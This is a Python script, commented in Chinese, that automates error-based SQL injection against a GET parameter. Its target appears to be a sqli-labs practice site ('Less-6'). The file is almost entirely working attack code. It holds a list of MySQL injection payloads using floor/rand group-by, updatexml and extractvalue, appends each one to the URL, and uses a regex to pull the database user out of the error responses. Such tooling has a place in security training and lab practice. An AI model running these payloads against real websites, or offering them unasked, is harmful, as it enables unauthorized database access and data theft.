# Get型
# 报错注入
import requests
from termcolor import cprint
import re

class error_Inject:

    error_payloads = [
        ' and (select 1 from(select count(*),concat(0x5e5e5e,user(),0x5e5e5e,floor(rand(0)*2))x from information_schema.character_sets group by x)a)--+',
        ' and (select 1 from (select count(*),concat(0x5e5e5e,user(),0x5e5e5e,floor(rand(0)*2))b from information_schema.tables group by b)a)--+',
        ' union select count(*),1,concat(0x5e5e5e,user(),0x5e5e5e,floor(rand(0)*2))x from information_schema.tables group by x --+',
        ' and (updatexml(1,concat(0x5e5e5e,(select user()),0x5e5e5e),1))--+',
        ' and (extractvalue(1,concat(0x5e5e5e,(select user()),0x5e5e5e)))--+'
        # ' and geometrycollection((select * from(select * from(select user())a)b))--+'
        # ' and multipoint((select * from(select * from(select user())a)b))--+',
        # ' and polygon((select * from(select * from(select user())a)b))--+',
        # ' and multipolygon((select * from(select * from(select user())a)b))--+',
        # ' and linestring((select * from(select * from(select user())a)b))--+',
        # ' and multilinestring((select * from(select * from(select user())a)b))--+',
        # ' and exp(~(select * from(select user())a))--+'
    ]

    def __init__(self, url):
        self.url = url
        self.Notes = ['--+', '-- ', '%23']  # 注释符

    def error_attack(self):
        for error_payload in self.error_payloads:
            payload = self.url + error_payload
            print('[:] 测试 ：{}'.format(payload))
            ret = requests.get(payload).text
            if '^^^' in ret:
                cprint('[+] 报错注入 ：payload : {}'.format(payload), 'red')
                cmp = '[\^][\^][\^](.*)[\^][\^][\^]'  # ^是元字符，所以要在方括号里并用斜杠去匹配^
                user = re.search(cmp, ret).group(1)
                cprint(user, 'yellow')
            else:
                cprint('[+] 不是报错注入 ：payload : {}'.format(payload), 'yellow')

    def attack(self):
        self.error_attack()

url = 'http://demo.sqli.com/Less-6/?id=1"'
#url = "http://demo.sqli.com/Less-10/?id=1"
error_Inject(url).attack()